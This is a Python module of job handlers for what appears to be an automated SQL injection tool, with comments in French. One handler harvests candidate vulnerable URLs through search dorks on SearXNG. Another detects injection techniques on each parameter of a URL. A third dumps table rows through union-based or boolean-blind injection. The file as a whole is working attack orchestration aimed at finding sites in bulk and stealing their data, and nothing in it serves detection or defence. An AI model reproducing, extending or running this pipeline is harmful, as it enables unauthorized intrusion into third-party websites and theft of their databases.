from __future__ import annotations

import asyncio
from typing import Any

from api.config import settings
from api.jobs.manager import JobContext
from engine.detection.engine import DetectionEngine, Detector, default_detectors
from engine.dorks.pipeline import filter_candidates
from engine.dorks.searxng import SearxngClient
from engine.dump.rows import count_rows, dump_rows
from engine.exploit.oracle import BooleanOracle
from engine.exploit.reader import BlindReader, UnionReader, ValueReader
from engine.http.client import AsyncHttpClient, HttpConfig
from engine.models import InjectionContext
from engine.target import injection_points, parse_target


def _client() -> AsyncHttpClient:
    return AsyncHttpClient(
        HttpConfig(concurrency=settings.concurrency, per_host_delay=settings.per_host_delay)
    )


def default_scan_detectors() -> list[Detector]:
    # Indirection pour permettre l'injection de détecteurs plus rapides en test.
    return default_detectors()


async def scan_handler(params: dict[str, Any], ctx: JobContext) -> dict[str, Any]:
    """Scanne une URL : détecte les techniques disponibles sur chaque point d'injection."""
    url = params["url"]
    contexts = (
        [InjectionContext(c) for c in params["contexts"]] if params.get("contexts") else None
    )
    target = parse_target(url)
    points = injection_points(target, contexts)
    engine = DetectionEngine(detectors=default_scan_detectors(), contexts=contexts)

    findings: list[dict[str, Any]] = []
    total = len(points) or 1
    async with _client() as client:
        for i, point in enumerate(points):
            for res in await engine.scan_point(client, point):
                findings.append(
                    {
                        "param": res.point.param.name,
                        "context": res.point.context.value,
                        "technique": res.technique.value,
                        "confidence": res.confidence,
                        "details": res.details,
                    }
                )
            await ctx.progress(round((i + 1) / total * 100, 1), f"point {i + 1}/{total}")
    return {"url": url, "findings": findings}


async def dork_handler(params: dict[str, Any], ctx: JobContext) -> dict[str, Any]:
    """Recherche des URLs candidates via SearXNG à partir d'une liste de dorks."""
    dorks: list[str] = params["dorks"]
    pages = int(params.get("pages", 1))
    base_url = params.get("searxng_url", settings.searxng_url)
    collected: list[str] = []
    total = len(dorks) or 1
    async with _client() as client:
        searx = SearxngClient(client, base_url)
        for i, dork in enumerate(dorks):
            collected.extend(await searx.search(dork, pages=pages))
            await ctx.progress(round((i + 1) / total * 100, 1), f"dork {i + 1}/{total}")
    return {"urls": filter_candidates(collected, require_params=True)}


def _build_reader(client: AsyncHttpClient, params: dict[str, Any]) -> ValueReader:
    target = parse_target(params["url"])
    context = InjectionContext(params.get("context", "numeric"))
    point = next(
        p for p in injection_points(target, [context]) if p.param.name == params["param"]
    )
    if params["technique"] == "union":
        return UnionReader(client, point, params["num_columns"], params["visible_index"])
    return BlindReader(BooleanOracle(client, point))


async def dump_handler(params: dict[str, Any], ctx: JobContext) -> dict[str, Any]:
    """Dump des lignes d'une table via la technique confirmée (union ou blind)."""
    db, table = params["db"], params["table"]
    columns: list[str] = params["columns"]
    async with _client() as client:
        reader = _build_reader(client, params)
        total = await count_rows(reader, db, table) or 1
        done = 0

        def on_row(_index: int, _row: dict[str, str]) -> None:
            nonlocal done
            done += 1
            asyncio.create_task(  # noqa: RUF006 - progression best-effort
                ctx.progress(round(done / total * 100, 1), f"ligne {done}/{total}")
            )

        rows = await dump_rows(
            reader,
            db,
            table,
            columns,
            concurrency=int(params.get("concurrency", 5)),
            on_row=on_row,
        )
    return {"db": db, "table": table, "columns": columns, "rows": rows, "count": len(rows)}


HANDLERS = {
    "scan": scan_handler,
    "dork": dork_handler,
    "dump": dump_handler,
}
